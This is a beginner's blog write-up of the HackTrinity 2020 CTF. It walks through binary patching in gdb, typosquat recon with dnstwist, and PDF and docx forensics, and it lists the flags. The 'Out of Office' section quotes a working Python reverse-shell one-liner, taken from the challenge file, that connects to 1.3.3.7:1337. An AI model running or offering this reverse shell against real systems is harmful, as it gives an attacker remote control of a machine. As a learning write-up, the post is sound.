---
title: HackTrinity CTF Write Up
date: 2020-03-23 12:00:00 +0000
categories: [Old]
tags: [ctf]
img_path: /assets/img/post/HackTrinity/
---

This last week I took part in my first ever CTF and therefore felt it appropriate to follow that with a write up of my own. The CTF was a collaboration between various societies at my university and was known as HackTrinity. This is my first ever write up and details solutions to the various challenges I was able to solve throughout the competition.

## Challenges

### Welcome

This was the first challenge in the competition and one of a few very simple ones. It acted as a simple tutorial to teach you the flag format and the solution was given.

> **Flag:** HackTrinity{well_that_was_easy}
{: .prompt-info }

### CHAD

This challenge was another of the so-called simple challenges and simply acted as a tutorial for setting up the instances service used for some of the challenges. Once setup the flag is found by visiting the given URL.

> **Flag:** HackTrinity{rutabaga_span_id_tortellini}
{: .prompt-info }

### Trivia - Unknown

This was the first of the trivia challenges. Once again it was another easy one as you were given a quote and upon googling that quote you would quickly come to the conclusion that it was said by Crash Override from the movie Hackers. This flag was non standard format.

> **Flag:** Crash Override
{: .prompt-info }

### Trivia - NotBotsAgain

To some this challenge is commonn knowledge but a quick google search will also tell you the answer. This flag was non standard format.

> **Flag:** crossdomain.xml
{: .prompt-info }

### Reversing - Locked Out

This was the first of the so-called _real_ challenges. You were presented with a simple binary that when ran produced the following output:

![HackTrinity_Locked_Out1.JPG](HackTrinity_Locked_Out1.JPG)

As is customary my first thought was to test for a buffer overflow vulnerability by filling the input with a large amount of letters, but alas this did not cause any problems as I had hoped. (Little did I know I made a small mistake here that I wouldn't notice until after the competition had concluded)

![HackTrinity_Locked_Out2.JPG](HackTrinity_Locked_Out2.JPG)

I knew the flag was likely in the binary and so my next idea was to simply try the "strings" command and grep for "HackTrinity" but once again this produced nothing. It seemed the flag was encrypted somehow within the binary. Finally I decided it was time to open up the binary in a disassembler for which I chose gdb as it was already installed on my ubuntu vm. After disassembling main I immediately noticed some functions which had proper names retrieved from the binary, most notably "enc_password", "decrypt", "print_flag" and "strcmp". Taking a look at the instruction calls it became clear that the binary encrypts the password taken in and then compares it against a decrypted password using the string compare function in C.

![HackTrinity_Locked_Out3.JPG](HackTrinity_Locked_Out3.JPG)

My first thought was to somehow just modify the jump instruction at "0x0000000040001475" to always jump no matter the result of the string compare but after a bit of research this turned out to not be as easy as I thought it would be. I discovered that a jump instruction in x86 is encoded based on the offset it wishes to jump to and this made creating a new jump instruction a bit more difficult then I intended, however I would have likely tried had my next idea not worked out.

Instead I chose to look into how the strcmp function worked in C by visiting its man page. As can be seen below it returns zero when the strings match.

![HackTrinity_Locked_Out4.JPG](HackTrinity_Locked_Out4.JPG)

After a little bit more research I discovered that the "test eax,eax" instruction after the strcmp function in the disassembled main is in fact where the program checks the result of strcmp. Thus I simply had to set a breakpoint at that instruction, modify eax to 0 and then continue. (Note that rax is eax on 64bit systems)

![HackTrinity_Locked_Out5.JPG](HackTrinity_Locked_Out5.JPG)

Bam! We have the flag:

> **Flag:** HackTrinity{h0w_cou1d_y0u_th3y_trusted_y0u}
{: .prompt-info }

As for the mistake I mentioned above, I later realised that the binary did infact have a buffer overflow vulnerability. It just happened to have a large-ish buffer of 256 characters so I never realised it. This knowledge would have allowed me to solve the next challenge in this cateogry, Locked Out 2, easily enough as well.

### Web - Casual

This challenge brings you to a website which has a simple browser version of the popular game 2048. The first thing I made sure to do, after quickly glancing around the website, was to open up the chrome developer console and check out the website's source. I spent quite a while searching around the javascript source code for the game for any potential clues as to the direction of the flag. I was thinking all I had to do was cheat the game and win and the flag would be revealed but I found nothing to indicate this was the case. After a frustrating amount of time searching, which was entirely my fault, I eventually found the flag commented out on the very last line of the "main.css" file. In hindsight I should have just tried searching every file for the keyword "HackTrinity" at the very beginning.

> **Flag:** HackTrinity{y0u_hav3_to_se4rch_f0r_it}
{: .prompt-info }

### Recon - CopyCats

This question asked for the handle of a fake Hack Trinity phishing page that someone set up for the 2019 competition to try and steal the flags for that year's challenges (the flag was in non standard format). I didn't participate in the 2019 competition so I would not have known the answer to this from the time. My initial thought was to head on over to the Hack Trinity twitter page and scroll all the way back to last year in search of a potential tweet about the phishing site. Sadly, I was unable to find anything of value after quite a bit of searching.

I reasoned I should probably take a much broader approach and began by googling types of phishing attacks. I quickly came to know the idea of typosquatting. This is when a person registers a url with a very slight difference to the real url of a website and tries to use it to fool a user into believing it is said website. This is an attack I already knew of but had never heard the name. After some more quick google searching I came across this tool called dnstwist which would scan for many potential typosquatted versions of a websites url. Upon installing and running it the results came back positive:

![HackTrinity_Copy_Cats1.JPG](HackTrinity_Copy_Cats1.JPG)

As can be seen the tool detected a single registered typosquatted version of the Hack Trinity domain. I was sure I had my flag and so I copied the domain name and threw it into the flag box only to receive:

![HackTrinity_Copy_Cats2.JPG](HackTrinity_Copy_Cats2.JPG)

I was baffled. I was sure I had the right answer but alas this was not the case. After a little more mindless attempts to make sure I had not made some silly mistake I ultimtely gave up and moved on to other challenges. It was not until the next day that I gave this challenge a go again. With a fresh start I decided to recheck the Hack Trinity twitter page for any clues I may have missed the previous day. This time however I made sure to scroll through their replies to tweets as well. Here I found a reply they made to a tweet referencing a fake Hack Trinity twitter page that was created to try and steal some of the flags from people. Suddenly I realised my major mistake. I had assumed that the challenge was looking for a phishing _website_ but in fact it had asked for their _handle_, the twitter handle of this fake twitter page.

> **Flag:** @HackTrinity19
{: .prompt-info }

### Forensics - Panic

This challenge gave you minimal information and a simple file called "bread.pdf". Upon opening it there is only one page with a picture of the empty bread isles in supermarkets due to coronavirus which I thought was a good homage to the current virus that shall not be named situation. I never really had any experience with the pdf format as a whole and so I began by searching for pdf virus analysis blogs online where I thought maybe some security researchers would make their own write ups on malicious pdf documents. My time spent searching led me to a tool called [peepdf](https://github.com/jesparza/peepdf) which is great for browsing the structure of a pdf document. After opening up "bread.pdf" in peepdf it gave me some information about the file such as the number of objects. It even helpfully labelled a suspicious element in object 8, however sadly there were no suspicious javascript elements as I had hoped there would be.

![HackTrinity_Panic1.JPG](HackTrinity_Panic1.JPG)

I was quick to open up this suspicious object using the object command but all I got back was some giberrish I didn't know what to do with so before investigating that further I checked out every other object as well. Ultimately I only found one other object of note which was object 2 as it also had some gibberish hidden within it.

![HackTrinity_Panic2.JPG](HackTrinity_Panic2.JPG)
![HackTrinity_Panic3.JPG](HackTrinity_Panic3.JPG)

I noted that the object 2 data was labelled as flate decode which I had heard of before as a compression algorithm. After a bit of messing around I realised the data is already decompressed as I was using the "object" command instead of "rawobject". The data still looked like gibberish to me though so I decided to start looking up some snippets of the string. A search online for "/Im4 Do Q" led me to realise ths data was in fact encoded text. As it turns out PDF's have their own way of encoding text into a document. I began researching this encoding to see if I could write a simple program to reverse it but after a bit of reading it became clear that such a task would not be so easy. After a little while of deliberating I realised I could probably use someone else's tool to extract the strings from a pdf document. After finding [this website](https://www.extractpdf.com/) it gave me the flag.

![HackTrinity_Panic4.JPG](HackTrinity_Panic4.JPG)

> **Flag:** HackTrinity{th3_f1ag_supply_cha1ns_ar3_str0ng}
{: .prompt-info }

(I ended up solving this in quite the roundabout way as you can see but hopefully it helped you learn something about the pdf file format)

### Forensics - Out of Office

Similar to "Panic" you were given a "hacked.docx" file and told to investigate it. It didn't take me long to discover that a docx file can actually be unzipped by most decompression tools therefore I used 7zip and was greeted by a handful of files and folders.

![HackTrinity_Out_Of_Office1.JPG](HackTrinity_Out_Of_Office1.JPG)

After some searching around I opened one of the xml files called "item1.xml" and found the following pastebin url:

![HackTrinity_Out_Of_Office1.JPG](HackTrinity_Out_Of_Office2.JPG)

_However_ after quickly copying it over to my browser it returned a page not found error? I was left stumped for a short while before thinking of a website I had used many a time in the past called the [Wayback Machine](https://archive.org/web/) which stores archived versions of webpages. Sure enough there was one snapshot saved of this pastebin url and bingo some code was hidden within:

```python
python - c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.3.3.7",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'#
all the 1337 hackers have a signature right ? SGFja1RyaW5pdHl7QWxXQHk1X0MxM2FOX1VwX0BmdDNyX3kwdVJfSEBjazV9Cg ==
```

From the looks of things it opens a reverse shell connection on port 1337 to your machine. I was wondering where to go from here and thought maybe I should listen for traffic on said port or something along those lines when I realised that there was no way this code ever ran as the pastebin url was invalid. That's when I remembered the base64 encoded string at the bottom. When decoded it in fact returns the flag.

> **Flag:** HackTrinity{AlW@y5_C13aN_Up_@ft3r_y0uR_H@ck5}
{: .prompt-info }

## The End

That's it for all the challenges I was able to solve this time around! I attempted many others but never quie finished them, although I came quite close on some :( . Ultimately I ended up placing 52nd which I'm pretty happy with although I definitely think I can do better in next year's. I hope this write up was informative in some way or atleast will inspire others to try out CTFs as they really are quite a lot of fun. One problem I have is a feeling this write up wasn't worded overly well and comes across as some kind of first person report rather then a fun read, therefore I vow to come back and try fix that some time in the future. I hope you enjoyed and thanks for reading :D



